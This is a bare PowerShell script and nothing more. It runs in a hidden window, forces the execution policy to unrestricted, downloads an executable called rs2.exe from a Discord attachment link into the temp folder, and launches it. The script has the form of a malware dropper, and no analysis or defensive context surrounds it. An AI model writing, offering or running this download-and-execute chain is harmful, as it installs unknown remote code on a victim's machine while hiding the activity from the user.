PowerShell.exe -WindowStyle hidden {

 
   Set-ExecutionPolicy unrestricted -Force;
   Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1258904556398575775/1269432329000980613/rs2.exe?ex=66b00a7c&is=66aeb8fc&hm=e549af8175dc96c9f2c86e9c50eb2701e2890fc2c0d479750ef14902a54355d5&" -OutFile "$env:temp\rs2.exe"; powershell "$env:temp\rs2.exe";
    

    
}
